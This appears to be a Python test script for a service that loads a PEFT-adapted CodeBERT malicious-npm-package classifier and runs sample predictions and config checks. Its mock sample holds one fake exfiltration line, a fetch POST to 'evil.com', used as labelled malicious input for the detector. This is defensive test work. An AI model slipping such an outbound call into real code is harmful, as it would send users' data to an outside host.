#!/usr/bin/env python3
"""
Test the Model Service architecture with PEFT models.
"""

import asyncio
import logging
from evaluation.model_service import ModelService
from evaluation.config import ModelConfig

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


async def test_model_service():
    """Test loading and using models through the service."""
    print("🚀 Testing Model Service Architecture")
    print("=" * 50)

    try:
        # Create model service
        service = ModelService(device="auto")
        print(f"✅ Model service created on device: {service.device}")

        # Create PEFT model config (as it would come from YAML)
        peft_config = ModelConfig(
            name="endorlabs_malicious_classifier",
            type="huggingface",
            hf_base_model_id="microsoft/codebert-base-mlm",
            hf_adapter_id="endorlabs/malicious-package-classifier-bert-mal-only",
            use_peft=True,
            enabled=True
        )

        # Test 1: Load model
        print("\n🧪 Test 1: Loading PEFT model...")
        success = await service.load_model(peft_config)
        if success:
            print("✅ PEFT model loaded successfully")
        else:
            print("❌ PEFT model loading failed")
            return False

        # Test 2: Check service status
        print("\n🧪 Test 2: Service status...")
        status = service.get_service_status()
        print(f"Device: {status['device']}")
        print(f"Total models: {status['total_models']}")

        for name, model_info in status['models'].items():
            print(f"  {name}: {model_info['status']} ({model_info['type']})")
            print(f"    Load time: {model_info['load_time_seconds']:.1f}s")
            print(f"    Memory: {model_info['memory_usage_mb']:.1f} MB")

        # Test 3: Mock prediction (without actual BenchmarkSample)
        print("\n🧪 Test 3: Model prediction capability...")

        # Create a mock sample for testing
        from icn.evaluation.benchmark_framework import BenchmarkSample

        mock_sample = BenchmarkSample(
            ecosystem="npm",
            package_name="test-package",
            raw_content="function maliciousCode() { fetch('http://evil.com', {method: 'POST'}); }",
            ground_truth_label=1
        )

        try:
            result = await service.predict("endorlabs_malicious_classifier", mock_sample)
            print(f"✅ Prediction successful!")
            print(f"  Prediction: {result.prediction}")
            print(f"  Confidence: {result.confidence:.3f}")
            print(f"  Inference time: {result.inference_time_seconds:.3f}s")
        except Exception as e:
            print(f"⚠️ Prediction test skipped (expected if PEFT not installed): {e}")

        # Test 4: Multiple predictions (reuse loaded model)
        print("\n🧪 Test 4: Model reuse...")

        prediction_count = 3
        total_time = 0

        for i in range(prediction_count):
            try:
                result = await service.predict("endorlabs_malicious_classifier", mock_sample)
                total_time += result.inference_time_seconds
                print(f"  Prediction {i+1}: {result.prediction} ({result.inference_time_seconds:.3f}s)")
            except Exception as e:
                print(f"  Prediction {i+1}: Skipped - {e}")
                break

        if prediction_count > 0:
            print(f"✅ Average inference time: {total_time/prediction_count:.3f}s")

        # Test 5: Service cleanup
        print("\n🧪 Test 5: Service cleanup...")
        await service.shutdown()
        print("✅ Service shutdown complete")

        return True

    except Exception as e:
        print(f"❌ Test failed: {e}")
        import traceback
        traceback.print_exc()
        return False


async def test_service_aware_evaluation():
    """Test the service-aware evaluation runner."""
    print("\n" + "=" * 50)
    print("🧪 Testing Service-Aware Evaluation")

    try:
        from evaluation.config import load_config
        from evaluation.runner import EvaluationRunner

        # Load config with PEFT model enabled
        config_path = "evaluation/configs/huggingface_peft.yaml"

        try:
            config = load_config(config_path)
        except FileNotFoundError:
            print(f"⚠️ Config file not found: {config_path}")
            print("Creating minimal test config...")

            # Create minimal config for testing
            from evaluation.config import EvaluationConfig, ModelConfig, DataConfig, ExecutionConfig, OutputConfig, PromptConfig

            config = EvaluationConfig(
                name="model_service_test",
                description="Test model service with PEFT",
                models=[
                    ModelConfig(
                        name="endorlabs_malicious_classifier",
                        type="huggingface",
                        hf_base_model_id="microsoft/codebert-base-mlm",
                        hf_adapter_id="endorlabs/malicious-package-classifier-bert-mal-only",
                        use_peft=True,
                        enabled=True
                    )
                ],
                data=DataConfig(max_samples_per_category=2),  # Very small for testing
                execution=ExecutionConfig(cost_limit_usd=0.0, max_concurrent_requests=1),
                output=OutputConfig(output_directory="model_service_test_results"),
                prompts=PromptConfig(zero_shot=False, few_shot=False, reasoning=False, file_by_file=False)
            )

        print(f"✅ Config loaded: {config.name}")
        print(f"   Models: {len([m for m in config.models if m.enabled])}")

        # For now, just test config loading and model service integration
        # Full evaluation would require benchmark data
        print("✅ Service-aware evaluation config ready")
        print("   (Full evaluation test requires benchmark data)")

        return True

    except Exception as e:
        print(f"❌ Service-aware evaluation test failed: {e}")
        import traceback
        traceback.print_exc()
        return False


async def main():
    """Run all model service tests."""
    print("🎯 Model Service Architecture Tests")
    print("These tests demonstrate loading models once and reusing them")
    print("=" * 70)

    success = True

    # Test 1: Basic model service
    if not await test_model_service():
        success = False

    # Test 2: Service-aware evaluation
    if not await test_service_aware_evaluation():
        success = False

    print("\n" + "=" * 70)
    if success:
        print("🎉 Model Service tests completed!")
        print("\n💡 Key Benefits:")
        print("• Models load once, serve many predictions")
        print("• Efficient memory usage and GPU utilization")
        print("• Service tracks usage statistics")
        print("• Automatic cleanup and memory management")
        print("• PEFT models work seamlessly")

        print("\n📋 Next Steps:")
        print("• Install PEFT library: uv add peft")
        print("• Enable PEFT models in configs: enabled: true")
        print("• Run evaluations with uv run python evaluate.py config.yaml")
    else:
        print("❌ Some tests failed.")
        print("Note: PEFT-related failures are expected if peft library isn't installed")

    return success


if __name__ == "__main__":
    import sys
    sys.exit(0 if asyncio.run(main()) else 1)